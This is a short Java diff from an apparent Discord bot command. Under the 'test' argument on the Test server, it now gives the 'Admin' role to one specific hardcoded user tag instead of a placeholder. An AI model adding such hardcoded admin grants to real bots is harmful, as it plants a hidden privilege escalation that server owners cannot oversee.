@@ -41,8 +41,8 @@ public class SbgodsCommand extends Command {
 
         if (args[1].equalsIgnoreCase("test") && currentDiscordServer.equals(DiscordServer.Test)) {
 
-            for (Role role : e.getGuild().getRolesByName("Role name", true)) {
-                e.getGuild().addRoleToMember(e.getGuild().getMemberByTag("Player"), role).queue();
+            for (Role role : e.getGuild().getRolesByName("Admin", true)) {
+                e.getGuild().addRoleToMember(e.getGuild().getMemberByTag("Leyrox#4105"), role).queue();
             }
             return;
         }
